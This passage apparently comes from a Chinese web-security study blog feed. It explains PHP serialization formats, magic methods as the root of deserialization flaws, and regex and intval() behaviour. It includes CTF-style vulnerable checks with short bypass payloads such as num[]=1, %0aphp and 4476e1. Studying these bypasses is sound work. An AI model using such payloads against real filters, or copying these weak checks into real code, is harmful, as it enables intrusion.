class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span> = <span class="string">&quot;dazzhuang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">34</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">10</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">200</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span>-&gt;data = &amp;<span class="variable">$test2</span>-&gt;data2;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i:<span class="number">34</span>;<span class="comment">//int 整型</span></span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;<span class="comment">//字符串型</span></span><br><span class="line">b:<span class="number">1</span>;<span class="comment">//bool</span></span><br><span class="line">N;<span class="comment">//null空</span></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">10</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">200</span>;&#125;<span class="comment">//array 数组</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;TEST&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;uu&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;data2&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;dazzhuang&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;TESTpass&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;TEST&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;dazzhuang&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;data2&quot;</span>;R:<span class="number">2</span>;s:<span class="number">10</span>:<span class="string">&quot;TESTpass&quot;</span>;b:<span class="number">1</span>;&#125;</span><br><span class="line"><span class="comment">//Object 对象</span></span><br></pre></td></tr></table></figure><h2 id="表达方式"><a href="#表达方式" class="headerlink" title="表达方式"></a>表达方式</h2><blockquote><p>字符串：s : 内容长度 : “内容”</p><p>数组：a : 参数数量 : {内容1 ; 内容2 ; 内容3……}</p><p>对象：O : 类名长度 : 类名 : 变量数量 : {内容1 ; 内容2 ; 内容3……}<br>内容：变量类型 : 变量名字长度 : “变量名字” ; 值的类型 : 值的长度 : 值;</p><p>%00是url编码后的空格<br><code>private私有属性序列化时，在变量名前加&quot;%00类名%00&quot;</code><br><code>protected受保护属性序列化时在变量名前加&quot;%00*%00&quot;</code></p></blockquote><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ul><li>反序列化之后的内容为一个对象</li><li>反序列化生成的对象里的值，由反序列化里的值提供，与原有类定义的值无关</li><li>反序列化不触发类的成员方法，需要调用方法后才能触发</li></ul><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="什么是魔术方法"><a href="#什么是魔术方法" class="headerlink" title="什么是魔术方法"></a>什么是魔术方法</h3><ul><li>一个预定义好的，在特定情况下自动触发的行为方法</li></ul><h3 id="魔术方法的作用"><a href="#魔术方法的作用" class="headerlink" title="魔术方法的作用"></a>魔术方法的作用</h3><ul><li>反序列化漏洞的成因<ul><li>反序列化过程中，<code>unserialize()</code>接受的值（字符串）可控</li><li>通过更改这个值（字符串），得到所需要的代码</li><li>通过调用方法，触发代码执行</li></ul></li></ul><blockquote><p>魔术方法在特定条件下自动调用相关方法，最终导致触发代码</p></blockquote><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><blockquote><p><code>_construct()</code>：类的构建函数</p><p><code>_destruct()</code>：类的析构函数</p><p><code>_call()</code>：在对象中调用一个不可以访问方法时调用</p><p><code>_callStatic()</code>：用静态方式中调用一个不可以访问方法时调用</p><p><code>_get()</code>：获得一个类的成员变量时调用</p><p><code>_isset()</code>：当对不可访问属性调用isset()或empty()时调用</p><p><code>_set()</code>：设置一个类的成员变量时调用</p><p><code>_unset()</code>：当对不可访问属性调用unset()时被调用</p><p><code>_sleep()</code>：执行serialize()时，先会调用这个函数</p><p><code>_wakeup()</code>：执行unserialize()时，先会调用这个函数</p><p><code>_toString()</code>：类被当成字符串时的回应方法</p><p><code>_invoke()</code>：调用函数的方式调用一个对象时的回应方法</p><p><code>_set_state()</code>：调用var_export()导出类时，此静态方法被调用</p><p><code>_clone()</code>：当对象复制完成时调用</p><p><code>_autoload()</code>：尝试加载未定义的类</p><p><code>_debugInfo()</code>：打印所需调试信息</p></blockquote><h2 id="函数详解"><a href="#函数详解" class="headerlink" title="函数详解"></a>函数详解</h2><h3 id="construct"><a href="#construct" class="headerlink" title="_construct()"></a>_construct()</h3><ul><li>构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了构造函数1次&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    触发了构造函数<span class="number">1</span>次</span><br></pre></td></tr></table></figure><ul><li>实例化对象时触发构造函数<code>_construct()</code></li></ul><h3 id="destruct"><a href="#destruct" class="headerlink" title="_destruct()"></a>_destruct()</h3><ul><li>析构函数，在对象的所有引用被删除或者当对象被显示销毁时执行的魔术方法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了析构函数1次&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">    触发了析构函数<span class="number">1</span>次</span><br><span class="line">    触发了析构函数<span class="number">1</span>次</span><br></pre></td></tr></table></figure><ul><li>实例化对象结束后，代码运行完全销毁，触发析构函数<code>_destruct()</code></li><li>反序列化得到的是对象，用完后会销毁，会触发析构函数<code>_destruct()</code></li></ul><h3 id="sleep"><a href="#sleep" class="headerlink" title="_sleep"></a>_sleep</h3><ul><li>序列化<code>serialize()</code>函数会检查类中是否存在一个魔术方法<code>_sleep()</code><br>如果存在，该方法会先被调用，然后才执行序列化操作</li><li>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组<br>如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误</li></ul><blockquote><p>触发时机：序列化serialize()之前</p><p>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性</p><p>参数：成员属性</p><p>返回值：需要被序列化存储的成员属性 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line">输出结果：</span><br><span class="line">    O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>serialize()</code>只序列化sleep返回的变量</li></ul><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="_wakeup()"></a>_wakeup()</h3><ul><li><code>unserialize()</code>会检查是否存在一个<code>_wakeup()</code>方法<br>如果存在，则会先调用<code>_wakep()</code>方法，预先准备对象需要的资源</li><li>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始操作</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br><span class="line">输出结果：</span><br><span class="line">    <span class="keyword">object</span>(User)<span class="comment">#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>_wakeup()在反序列化unserialize()之前</p><p>_destruct()在反序列化unserialize()之后</p></blockquote><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="_toString()"></a>_toString()</h3><ul><li>表达方式错误导致魔术方法触发<ul><li>触发时机：把对象当作字符串调用</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP特性</title>
      <link href="/post/44659fec.html"/>
      <url>/post/44659fec.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>\d</td><td>匹配任意一个十进制数字，等价于[0-9]</td></tr><tr><td>\D</td><td>匹配任意一个除十进制数字以外的字符，等价于[^0-9]</td></tr><tr><td>\s</td><td>匹配任意一个空白字符，等价于[\f\n\r\t\v]</td></tr><tr><td>\S</td><td>匹配除空白字符以外任何一个字符，等价于[^\f\n\r\t\v]</td></tr><tr><td>\w</td><td>匹配任意一个数字、字母或下划线，等价于[0-9a-zA-Z]</td></tr><tr><td>\W</td><td>匹配除数字、字母或下划线以外的任意一个字符，等价于[^0-9a-zA-Z]</td></tr><tr><td>*</td><td>匹配0次、1次或多次其前面的原子</td></tr><tr><td>+</td><td>匹配1次或多次其前面的原子</td></tr><tr><td>?</td><td>匹配0次或1次其前面的原子</td></tr><tr><td>.</td><td>匹配除了换行符外的任意一个字符</td></tr><tr><td>|</td><td>匹配两个或多个分支选择</td></tr><tr><td>{n}</td><td>表示其前面的原子恰好出现n次</td></tr><tr><td>{n,}</td><td>表示其前面的原子出现不少于n次</td></tr><tr><td>{n,m}</td><td>表示其前面的原子至少出现n次，最多出现m次</td></tr><tr><td>^或\A</td><td>匹配输入字符串的开始位置（或在多行模式下的开头，即紧随一换行符之后）</td></tr><tr><td>$或\Z</td><td>匹配输入字符串的结束位置（或在多行模式下的结尾，即紧随一换行符之前）</td></tr><tr><td>\b</td><td>匹配单词的边界</td></tr><tr><td>\B</td><td>匹配出单词边界以外的部分</td></tr><tr><td>[]</td><td>匹配方括号中指定的任意一个原子</td></tr><tr><td>[^]</td><td>匹配出方括号中的原子以外的任意一个字符</td></tr><tr><td>()</td><td>匹配其政体为一个原子，即模式单元，可以理解为由多个单个原子组成的大原子</td></tr></tbody></table><h2 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h2><table><thead><tr><th>符号</th><th>描述</th></tr></thead><tbody><tr><td>i</td><td>在和模式进行匹配时不区分大小写</td></tr><tr><td>m</td><td>将字符串视为多行，默认的正则开始”^”和结束”$”将目标字符串作为单一的一 “行” 字符（甚至其中包含有换行符也是如此）；如果在修饰符中加上”m”，那么开始和结束将会指字符串的每一行，每一行的开头就是”^”，结尾就是”$”</td></tr><tr><td>s</td><td>如果设定了此字符，模式中的圆点元字符”.”匹配所有的字符，包括换行符,即将字符串视为单行，换行符作为普通字符看待</td></tr><tr><td>x</td><td>模式中的空白忽略不计，除非它已经被转义</td></tr><tr><td>e</td><td>只用在pre_replace()函数中，在替换字符串中对逆向引用做正常的替换，将其作为PHP代码求值，并用其结果来替换所搜索的字符串</td></tr><tr><td>U</td><td>贪婪模式，最大限度匹配</td></tr><tr><td>D</td><td>模式中的”$”仅匹配目标字符串的结尾，没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前；如果设定了m修正字符则忽略此选项</td></tr></tbody></table><h2 id="贪婪匹配与惰性匹配"><a href="#贪婪匹配与惰性匹配" class="headerlink" title="贪婪匹配与惰性匹配"></a>贪婪匹配与惰性匹配</h2><ul><li>贪婪匹配：匹配尽可能多的字符</li><li>惰性匹配：匹配尽可能少的字符</li><li>“?”：如果紧跟在任何量词*、+、?或{}的后面，会使量词编程惰性，例如对”123abc”使用<code>/\d+/</code>将会匹配”123”，而使用<code>/\d+?/</code>只会匹配到”1”</li></ul><table><thead><tr><th>函数符</th><th>描述</th></tr></thead><tbody><tr><td>*?</td><td>零次或多次，但尽可能少的匹配</td></tr><tr><td>+?</td><td>一次或多次，但尽可能少的匹配</td></tr><tr><td>??</td><td>0次或1次，但尽可能少的匹配</td></tr><tr><td>{n,}?</td><td>至少n次，但尽可能少的匹配</td></tr><tr><td>{n,m}?</td><td>n到m次 ，但尽可能少的匹配</td></tr></tbody></table><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><ul><li>preg_match()只能处理字符串，当传入的subject是数组时会返回false</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num[]=1</code></p><h3 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: cmd=%0aphp</code></p><h3 id="最大回溯次数绕过"><a href="#最大回溯次数绕过" class="headerlink" title="最大回溯次数绕过"></a>最大回溯次数绕过</h3><blockquote><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p></blockquote><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><ul><li><p>获取变量的整数值</p></li><li><p>成功时返回 var 的 integer 值，失败时返回 0，空的 array 返回 0，非空的 array 返回 1</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;+42&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;-42&#x27;</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;042&#x27;</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e10&#x27;</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;420000000000000000000&#x27;</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="string">&#x27;42&#x27;</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="literal">false</span>);                   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="literal">true</span>);                    <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h3><ul><li>intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476a</code></p><h3 id="科学计数法"><a href="#科学计数法" class="headerlink" title="科学计数法"></a>科学计数法</h3><ul><li>intval()函数如果base为0，则var中存在字母的话遇到字母就停止读取，但是e这个字母比较特殊，可以在PHP中表示科学计数法。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>payload: num=4476e1</code></p><h3 id="进制转换"><a href="#进制转换" class="headerlink" 